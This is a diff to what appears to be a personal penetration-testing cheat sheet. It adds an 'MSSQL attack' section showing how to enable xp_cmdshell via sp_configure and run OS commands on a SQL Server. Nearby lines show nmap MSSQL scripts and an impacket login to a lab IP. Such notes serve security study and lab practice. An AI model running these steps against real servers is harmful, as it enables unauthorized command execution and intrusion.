@@ -492,6 +492,21 @@ $ sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql
 ```
 - mssql_ping  metaspolit
 
+### MSSQL attack
+- rce 
+```shell
+xp_cmdshell 'whoami'
+
+# enable xp_cmdshell
+EXECUTE sp_configure 'show advanced options', 1
+RECONFIGURE
+EXECUTE sp_configure 'xp_cmdshell', 1
+RECONFIGURE
+
+
+```
+- 
+
 ### Service Interaction
 ```bash
 /usr/share/doc/python3-impacket/examples/mssqlclient.py Administrator@10.129.201.248 -windows-auth
